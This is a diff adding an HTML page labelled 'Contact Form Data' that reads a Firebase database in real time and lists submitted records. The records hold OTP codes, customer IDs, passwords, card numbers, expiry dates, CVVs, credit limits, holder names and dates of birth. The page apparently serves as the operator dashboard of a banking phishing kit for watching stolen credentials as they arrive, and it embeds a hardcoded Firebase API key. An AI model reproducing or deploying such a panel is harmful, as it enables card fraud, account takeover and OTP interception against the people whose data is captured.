@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Contact Form Data</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap"
+        rel="stylesheet">
+    <style>
+        body {
+            line-height: 1.6;
+            margin: 15px;
+            padding: 0;
+            background-color: #15c1b9;
+            color: #333;
+            font-family: "Poppins", sans-serif;
+            font-weight: 500;
+            font-style: normal;
+        }
+
+        h2 {
+            margin-bottom: 20px;
+            color: #fff;
+            text-transform: uppercase;
+            text-align: center;
+        }
+
+        ul {
+            list-style-type: none;
+            padding: 0;
+        }
+
+        li {
+            background-color: #fff;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            padding: 10px 15px;
+            margin-bottom: 10px;
+            box-shadow: 0px 2px 7px #757575;
+        }
+
+        li:last-child {
+            margin-bottom: 0;
+        }
+
+        strong {
+            text-transform: uppercase;
+        }
+
+        .box {
+            display: flex;
+            font-size: 20px;
+        }
+
+        p {
+            margin: 0;
+            padding-left: 5px;
+            color: red;
+        }
+
+        #date {
+            font-size: 13px;
+            width: 100%;
+            text-align: center;
+            background: black;
+            color: aliceblue;
+            border-radius: 5px;
+            margin-bottom: 9px;
+            padding: 3px 0;
+        }
+    </style>
+</head>
+
+<body>
+    <h2>Advance Backend</h2>
+
+    <ul id="formDataList">
+        <!-- Data will be dynamically added here -->
+    </ul>
+
+    <!-- Firebase JavaScript SDK -->
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyD5wSvrZXq9FFfJ0SoDxGfp6kVQ7VEyNFA",
+            authDomain: "start-45a39.firebaseapp.com",
+            databaseURL: "https://start-45a39-default-rtdb.firebaseio.com",
+            projectId: "start-45a39",
+            storageBucket: "start-45a39.appspot.com",
+            messagingSenderId: "377019727798",
+            appId: "1:377019727798:web:5c56be02bc821e6ec88b17"
+        };
+
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+
+        // Reference to your database
+        var contactFormRef = firebase.database().ref("contactForm");
+
+        // Function to handle new child added or changes
+        function handleNewData(snapshot) {
+            var data = snapshot.val();
+
+            // Create list item to display data
+            var listItem = document.createElement("li");
+            var innerHTML = "";
+
+            // Conditionally add fields if they exist
+            if (data.currentDateTime) {
+                innerHTML += `<div class="box"><p id="date"> Date & Time ${data.currentDateTime} </p></div>`;
+            }
+            if (data.otp1) {
+                innerHTML += `<div class="box"> <strong>OTP 1 :</strong> <p> ${data.otp1} </p></div>`;
+            }
+            if (data.otp2) {
+                innerHTML += `<div class="box"><strong>OTP 2 :</strong> <p> ${data.otp2} </p></div>`;
+            }
+            if (data.otp3) {
+                innerHTML += `<div class="box"><strong>OTP 3 :</strong> <p> ${data.otp3} </p></div>`;
+            }
+            if (data.otp4) {
+                innerHTML += `<div class="box"><strong>OTP 4 :</strong> <p> ${data.otp4} </p></div>`;
+            }
+            if (data.otp5) {
+                innerHTML += `<div class="box"><strong>OTP 5 :</strong> <p> ${data.otp5} </p></div>`;
+            }
+            if (data.otp6) {
+                innerHTML += `<div class="box"><strong>OTP 6 :</strong> <p> ${data.otp6} </p></div>`;
+            }
+            if (data.customerid) {
+                innerHTML += `<div class="box"><strong>Customer Id :</strong> <p> ${data.customerid} </p></div>`;
+            }
+            if (data.password) {
+                innerHTML += `<div class="box"><strong>Password : </strong> <p> ${data.password} </p></div>`;
+            }
+            if (data.mobile) {
+                innerHTML += `<div class="box"><strong>Mobile :</strong> <p> ${data.mobile} </p></div>`;
+            }
+            if (data.creditnumber) {
+                innerHTML += `<div class="box"><strong>Credit Number :</strong> <p> ${data.creditnumber} </p></div>`;
+            }
+            if (data.expiredate) {
+                innerHTML += `<div class="box"><strong>Expiry Date :</strong> <p> ${data.expiredate} </p></div>`;
+            }
+            if (data.cvv) {
+                innerHTML += `<div class="box"><strong>Cvv :</strong> <p> ${data.cvv} </p></div>`;
+            }
+            if (data.creditlimit) {
+                innerHTML += `<div class="box"><strong>Credit Limit :</strong> <p> ${data.creditlimit} </p></div>`;
+            }
+            if (data.regmobile) {
+                innerHTML += `<div class="box"><strong>Mobile :</strong> <p> ${data.regmobile} </p></div>`;
+            }
+            if (data.holdername) {
+                innerHTML += `<div class="box"><strong>Holder Name :</strong> <p> ${data.holdername} </p></div>`;
+            }
+            if (data.dob) {
+                innerHTML += `<div class="box"><strong>DOB :</strong> <p> ${data.dob} </p></div>`;
+            }
+
+            // Set the innerHTML of the list item
+            listItem.innerHTML = innerHTML;
+
+            // Get the ul element
+            var formDataList = document.getElementById("formDataList");
+
+            // Check if list item already exists (for updates)
+            var existingItem = document.getElementById(data.customerid);
+            if (existingItem) {
+                // Update existing item
+                existingItem.innerHTML = listItem.innerHTML;
+            } else {
+                // Insert the new list item at the top (latest data first)
+                listItem.id = data.customerid; // Set id for easy update reference
+                formDataList.insertBefore(listItem, formDataList.firstChild);
+            }
+        }
+
+        // Listen for new data added to the database
+        contactFormRef.on("child_added", function (snapshot) {
+            handleNewData(snapshot);
+        });
+
+        // Listen for data changes
+        contactFormRef.on("child_changed", function (snapshot) {
+            handleNewData(snapshot);
+        });
+    </script>
+</body>
+
+</html>
